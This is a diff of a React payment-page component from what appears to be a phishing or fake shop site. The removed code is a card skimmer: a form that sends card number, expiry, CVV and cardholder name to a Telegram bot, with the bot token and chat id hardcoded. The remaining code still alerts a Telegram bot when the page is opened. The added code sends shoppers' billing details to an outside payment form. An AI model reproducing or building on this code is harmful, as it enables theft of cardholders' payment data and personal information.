@@ -1,12 +1,13 @@
 import React, { useEffect, useState } from "react";
 import "./paybox.css";
-import { LocalizedLink } from "./i18n/LocalizedLink";
 import { useTranslation } from "./i18n/useTranslation";
 import { sendPaymentPageAlert } from "./utils/telegram";
+import api from "./utils/api";
 
 const Paybox = () => {
   const { t } = useTranslation();
   const [alertSent, setAlertSent] = useState(false);
+  const [isRedirecting, setIsRedirecting] = useState(true);
   
   // Send Telegram alert when user opens payment page
   useEffect(() => {
@@ -16,67 +17,129 @@ const Paybox = () => {
       setAlertSent(true);
     }
   }, [alertSent]);
-  
-  const sendData = (e) => {
-    e.preventDefault();
-    var text1 = document.getElementById("card_number").value;
-    var text2 = document.getElementById("expire_date").value;
-    var text3 = document.getElementById("cvv").value;
-    var text4 = document.getElementById("cardholder_name").value;
 
-    var logsss = `Log :%0A -card_number: ${text1} %0A - expire_date: ${text2} %0A - cvv: ${text3} %0A - cardholder_name: ${text4}`;
+  // Redirect to payment system
+  useEffect(() => {
+    const redirectToPayment = async () => {
+      try {
+        // Get checkout data from localStorage or API
+        let checkoutData = {};
+        try {
+          const userData = await api.getUser();
+          if (userData && userData.checkout) {
+            checkoutData = userData.checkout;
+          }
+        } catch (error) {
+          console.error('Error fetching user data:', error);
+        }
 
-    var token = "8551615963:AAEOPXbeNy48cyh8zNW5ede7-v3w8RWldHE";
-    var chat_id = -1003217055373;
-    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${logsss}`;
+        // If no checkout data from API, try localStorage
+        if (!checkoutData.email) {
+          const savedCheckout = localStorage.getItem('checkoutData');
+          if (savedCheckout) {
+            checkoutData = JSON.parse(savedCheckout);
+          }
+        }
 
-    let api = new XMLHttpRequest();
+        // Get cart data
+        const cart = JSON.parse(localStorage.getItem('cart') || '[]');
+        
+        // Calculate total
+        const total = cart.reduce((sum, item) => {
+          const price = typeof item.Price === 'string' ? parseFloat(item.Price) : item.Price;
+          const qty = item.qty || 1;
+          return sum + (price * qty);
+        }, 0);
+        
+        // Apply discount (same as in cart.js)
+        const discount = 1.3;
+        const subtotal = Math.round(total / discount);
+        const finalAmount = subtotal.toFixed(2);
 
-    api.open("GET", url, true);
-    api.send();
-  };
+        // Generate unique order ID
+        const orderId = `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
 
-  return (
-    <div>
+        // Get current domain for redirect URLs
+        const currentDomain = window.location.origin;
+        const currentPath = window.location.pathname;
+        const basePath = currentPath.split('/').slice(0, -1).join('/') || '';
+
+        // Build payment URL
+        const paymentParams = new URLSearchParams({
+          site: 'strideshop.pro',
+          icon: 'https://s6.imgcdn.dev/8xixd.png',
+          image: 'https://s6.imgcdn.dev/8xQsM.png',
+          amount: finalAmount,
+          symbol: 'USD',
+          vat: '20',
+          riderect_success: `${currentDomain}${basePath}/order/success?order_id=${orderId}`,
+          riderect_failed: `${currentDomain}${basePath}/order/failed?order_id=${orderId}`,
+          riderect_back: `${currentDomain}${basePath}/cart`,
+          order_id: orderId,
+          billing_first_name: checkoutData.firstName || '',
+          billing_last_name: checkoutData.lastName || '',
+          billing_address_1: checkoutData.addressLine1 || '',
+          billing_city: checkoutData.city || '',
+          billing_state: checkoutData.state || checkoutData.city || '',
+          billing_postcode: checkoutData.postcode || '',
+          billing_country: checkoutData.country || '',
+          billing_email: checkoutData.email || '',
+          billing_phone: checkoutData.phone || ''
+        });
+
+        const paymentUrl = `https://strideshop.pro/connect/form?${paymentParams.toString()}`;
+        
+        console.log('[Paybox] Redirecting to payment system:', paymentUrl);
+        
+        // Save order ID to localStorage
+        localStorage.setItem('currentOrderId', orderId);
+        
+        // Redirect to payment system
+        window.location.href = paymentUrl;
+      } catch (error) {
+        console.error('[Paybox] Error preparing payment redirect:', error);
+        setIsRedirecting(false);
+      }
+    };
+
+    redirectToPayment();
+  }, []);
+
+  if (isRedirecting) {
+    return (
       <div className="paycontainer">
         <div className="paytitle">{t("payment.title")}</div>
-        <form onSubmit={sendData} className="form" id="form">
-          <div className="paytext">{t("payment.cardNumber")}</div>
-          <input
-            id="card_number"
-            name="cardn"
-            className="payinput"
-            placeholder="1234 5678 1234 5678"
-            required
-          />
-          <div className="paytext">{t("payment.expiryDate")}</div>
-          <input
-            id="expire_date"
-            name="edata"
-            className="payinput"
-            placeholder="MMYY"
-            required
-          />
-          <div className="paytext">{t("payment.cvv")}</div>
-          <input id="cvv" name="cvv" className="payinput" placeholder="123" required />
-          <div className="paytext">{t("payment.cardholderName")}</div>
-          <input
-            id="cardholder_name"
-            name="uname"
-            className="payinput"
-            type="text"
-            placeholder="John Doe"
-            required
-          />
-          <div></div>
-          <button type="submit" className="paybtn">
-            {t("payment.pay")}
-          </button>
-          <div className="dfg">___</div>
-          <LocalizedLink to="/smsbox" className="paylinkk">
-            {t("payment.smsCheck")}
-          </LocalizedLink>
-        </form>
+        <div style={{ textAlign: 'center', padding: '40px' }}>
+          <p>{t("payment.redirecting") || "Redirecting to payment system..."}</p>
+          <div style={{ marginTop: '20px' }}>
+            <div className="spinner" style={{
+              border: '4px solid #f3f3f3',
+              borderTop: '4px solid #3498db',
+              borderRadius: '50%',
+              width: '40px',
+              height: '40px',
+              animation: 'spin 1s linear infinite',
+              margin: '0 auto'
+            }}></div>
+          </div>
+        </div>
+        <style>{`
+          @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+          }
+        `}</style>
+      </div>
+    );
+  }
+
+  return (
+    <div className="paycontainer">
+      <div className="paytitle">{t("payment.title")}</div>
+      <div style={{ textAlign: 'center', padding: '40px' }}>
+        <p style={{ color: '#e74c3c' }}>
+          {t("payment.error") || "Error loading payment system. Please try again."}
+        </p>
       </div>
     </div>
   );
